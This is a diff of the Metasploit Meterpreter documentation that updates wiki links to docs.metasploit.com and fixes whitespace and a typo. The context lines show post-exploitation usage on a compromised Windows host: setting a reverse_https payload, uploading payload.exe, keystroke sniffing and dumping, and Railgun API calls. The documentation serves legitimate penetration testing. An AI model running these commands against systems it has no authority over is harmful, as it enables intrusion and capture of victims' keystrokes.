@@ -57,7 +57,7 @@ To actually set the payload:
 
 1. In msfconsole, load the exploit.
 2. Do: ```set PAYLOAD windows/meterpreter/reverse_https```
-3. Set the ```LHOST``` OPTION WHICH, which [IP the same the payload connect to](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit).
+3. Set the ```LHOST``` OPTION WHICH, which [IP the same the payload connect to](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html).
 4. Run th exploit
 
 **As a standalone**
@@ -105,7 +105,7 @@ The ```upload``` command allows you to upload a file to the remote target. For e
 meterpreter > upload /tmp/payload.exe C:\\Users\\sinn3r\\Desktop
 [*] uploading  : /tmp/payload.exe -> C:\Users\sinn3r\Desktop
 [*] uploaded   : /tmp/payload.exe -> C:\Users\sinn3r\Desktop\payload.exe
-meterpreter > 
+meterpreter >
 ```
 
 The ```-r``` option for the command also allows you to upload recursively.
@@ -164,7 +164,7 @@ IPv4 Netmask : 255.255.255.0
 IPv6 Address : fe80::5911:c25:bd50:5a6d
 IPv6 Netmask : ffff:ffff:ffff:ffff::
 
-meterpreter > 
+meterpreter >
 ```
 The command ```ipconfig``` is an alias for ```ifconfig```.
 
@@ -219,7 +219,7 @@ System Language : en_US
 Domain          : WORKGROUP
 Logged On Users : 2
 Meterpreter     : x86/win32
-meterpreter > 
+meterpreter >
 ```
 
 **keyscan command**
@@ -237,7 +237,7 @@ Starting the keystroke sniffer...
 meterpreter > keyscan_dump
 Dumping captured keystrokes...
 hello world!
-meterpreter > 
+meterpreter >
 ```
 
 **keyscan_stop command**
@@ -333,7 +333,7 @@ from popular applications and enumerate or modify system settings.
 To use a post module from the Meterpreter prompt, simply use the ```run``` command:
 
 ```
-meterpreter > run post/windows/gather/checkvm 
+meterpreter > run post/windows/gather/checkvm
 
 [*] Checking if WIN-6NH0Q8CJQVM is a Virtual Machine .....
 [*] This is a VMware Virtual Machine
@@ -353,7 +353,7 @@ meterpreter > irb
 [*] Starting IRB shell
 [*] The 'client' variable holds the meterpreter client
 
->> 
+>>
 ```
 
 **The client object**
@@ -394,7 +394,7 @@ Railgun allows you to use the remote machine's Windows API in Ruby. For example,
 => {"GetLastError"=>0, "ErrorMessage"=>"The operation completed successfully.", "return"=>1}
 ```
 
-To learn more about using Railgun, please read this [wiki](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation).
+To learn more about using Railgun, please read this [wiki](https://docs.metasploit.com/docs/development/developing-modules/libraries/how-to-use-railgun-for-windows-post-exploitation.html).
 
 
 ## Routing through the portfwd command
@@ -445,7 +445,7 @@ other third-party tools to do the same.
 
 A stageless Meterpreter allows a more economical way to deliver the payload, for cases where a
 normal one would actually cost too much time and bandwidth in a penetration test. To learn more
-about this, [click on this](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Stageless-Mode)
+about this, [click on this](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html)
 to read more.
 
 To use the stageless payload, use ```windows/meterpreter_reverse_https``` instead.
@@ -464,7 +464,7 @@ meterpreter > sleep 20
 And that will allow Meterpreter to sleep 20 seconds, and will reconnect as long as the handler
 remains active (such as running as a background job).
 
-To learn more about this feature, please [click here](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Sleep-Control).
+To learn more about this feature, please [click here](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-sleep-control.html).
 
 ## Meterpreter Timeout Control
 
@@ -472,7 +472,7 @@ The timeout control basically defines the life span of Meterpreter. To configure
 ```set_timeouts``` command:
 
 ```
-meterpreter > set_timeouts 
+meterpreter > set_timeouts
 Usage: set_timeouts [options]
 
 Set the current timeout options.
@@ -484,7 +484,7 @@ OPTIONS:
     -h        Help menu
     -t <opt>  Retry total time (seconds)
     -w <opt>  Retry wait time (seconds)
-    -x <opt>  Expiration timout (seconds)
+    -x <opt>  Expiration timeout (seconds)
 ```
 
 To see the current timeout configuration, you can use the ```get_timeouts``` command:
@@ -497,7 +497,7 @@ Retry Total Time: 3600 seconds
 Retry Wait Time : 10 seconds
 ```
 
-To learn more about timeout control, please [go here](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Timeout-Control).
+To learn more about timeout control, please [go here](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-timeout-control.html).
 
 ## Meterpreter Transport Control
 
@@ -505,5 +505,5 @@ Transport Control allows you manage transports on the fly while the payload sess
 running. Meterpreter can automatically cycle through the transports when communication fails,
 or you can do it manually.
 
-To learn more about this, please read this [documentation](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control).
+To learn more about this, please read this [documentation](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html).
 
